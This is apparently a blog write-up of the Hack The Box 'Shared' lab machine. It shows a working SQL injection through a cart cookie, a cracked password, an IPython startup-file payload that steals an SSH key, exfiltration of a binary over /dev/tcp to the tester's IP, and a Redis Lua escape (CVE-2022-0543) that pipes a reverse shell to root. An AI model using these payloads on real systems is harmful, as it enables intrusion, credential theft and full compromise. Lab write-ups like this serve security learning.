---
layout: single
title: Shared HTB writeup
excerpt: "Medium linux machine in which we use SQL injection, exploit ipython and redis"
date: 2022-08-01
classes: wide
header:
  teaser: /assets/images/shared/icon-shared.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - SQL injection
  - ipython
  - redis
---

![](/assets/images/shared/shared.png)

# Shared
## User flag

```shell
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

The page appears to be a shop and it's fatal flaw can easily be spotted in the checkout subdomain when you try and purchase something. Looking at the cookies there is a custom cart cookie that is url encoded. However decoding it has no effect and it may be vulnerable to SQL injection so I tried to fuzz the cookie

```shell
ffuf -w ~/wordlist/SQL.txt -u http://checkout.shared.htb -b "custom_cart={"FUZZ":"1"}" -fs 3229

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://checkout.shared.htb
 :: Wordlist         : FUZZ: /home/dasor/wordlist/SQL.txt
 :: Header           : Cookie: custom_cart={FUZZ:1}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 3229
________________________________________________

"' or 1 --'"            [Status: 200, Size: 3593, Words: 1827, Lines: 70]
```

Although the -b option from ffuf didn't work as I expected since I wanted it to use the \"\" it still gave me an interesting hint. This result probably means the cookie is vulnerable to comment injection and eventually after getting some data with this cookies I found a hashed md5 password


```shell
{"cn' union select 1,database(),3 #":"1"}
{"cn' union select 1,TABLE_NAME,3 from INFORMATION_SCHEMA.TABLES where table_schema='checkout'#":"1"}
{"cn' union select 1,COLUMN_NAME,3 from INFORMATION_SCHEMA.COLUMNS where table_name='user'#":"1"}
{"cn' union select 1,username,3 from checkout.user #":"1"}
{"cn' union select 1,password,3 from checkout.user #":"1"}
```

Once the hash was cracked it was time to get connected by ssh

```shell
hashcat --show -m 0 pass ~/wordlist/rockyou.txt
fc895d4eddc2fc12f995e18c865cf273:Soleil101
```

Once in pspy I found some interesting stuff being executed by the user dan\_smith regularly

```shell
james_mason@shared:/tmp$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
2022/08/14 10:31:02 CMD: UID=1001 PID=120589 | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython

```
iphyton is being executed regularly so I searched for an exploit and found [this](https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x)


```shell
mkdir -m 777 profile_default; cd profile_default; mkdir -m 777 startup ; cd startup ; echo "import os; os.system('cat ~/.ssh/id_rsa > /tmp/key')" > foo.py
```

By using this payload I got the ssh private key and logged as dan\_smith getting the user flag. After some time of not getting anything with linpeas and pspy I looked at the groups of the user and searched for file owned by that group

## Root flag

```shell
dan_smith@shared:~$ groups
dan_smith developer sysadmin
dan_smith@shared:~$ find / -group sysadmin 2>/dev/null
/usr/local/bin/redis_connector_dev
```

The binary logged into redis so I copied it to my system to see the credentials

```shell
dan_smith@shared:~$ cat /usr/local/bin/redis_connector_dev >& /dev/tcp/10.10.14.60/7777 0>&1
...
[dasor@archlinux ~/htb/shared]$ nc -lvp 7777 > binary
Connection from 10.10.11.172:34794
[dasor@archlinux ~/htb/shared]$ chmod a+x binary
[dasor@archlinux ~/htb/shared]$ ./binary
[+] Logging to redis instance using password...

INFO command result:
 i/o timeout

... (other console)

[dasor@archlinux ~]$ nc -lvp 6379
Connection from 127.0.0.1:53292
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```

Once in I knew this instance was probably vulnerable to CVE-2022-0543 (lua code injection) so I tried

```shell
dan_smith@shared:~$ redis-cli --pass F2WHqJUz2WEz=Gqq
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
"uid=0(root) gid=0(root) groups=0(root)\n"
```

Now I just had to use that to escalate privileges yet chmod u+s /bin/bash wasn't working as well as the reverse shell until I thought of a smarter method a.k.a writing the reverse shell to a file and then piping bash

```
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /dev/shm/rv | bash ", "r"); local res = f:read("*a"); f:close(); return res' 0
...
nc -lvp 7777
```

However the reverse shell doesn't last forever but is more than enough to get the flag.
